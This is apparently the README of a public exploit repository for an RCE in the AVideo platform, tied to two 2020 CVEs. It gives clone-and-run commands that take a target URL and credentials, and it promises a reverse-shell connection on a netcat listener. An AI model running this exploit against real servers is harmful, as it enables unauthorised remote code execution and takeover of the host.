# AVideo3xploit.go

RCE exploit for [AVideo](https://github.com/WWBN/AVideo/) 

```
root@kali:~# go get github.com/fatih/color
root@kali:~# git clone https://github.com/ahussam/AVideo3xploit.git
root@kali:~# cd AVideo3xploit
root@kali:~/AVideo3xploit# go run AVideo3xploit.go http://[target]/avideo/ username password
```

You should get a connection on your nc 

![avideo-5](av-5.png)

## Write-up 

https://cube01.io/blog/Avideo-Remote-Code-Execution.html

## CVE 

CVE-2020-23489 & CVE-2020-23490

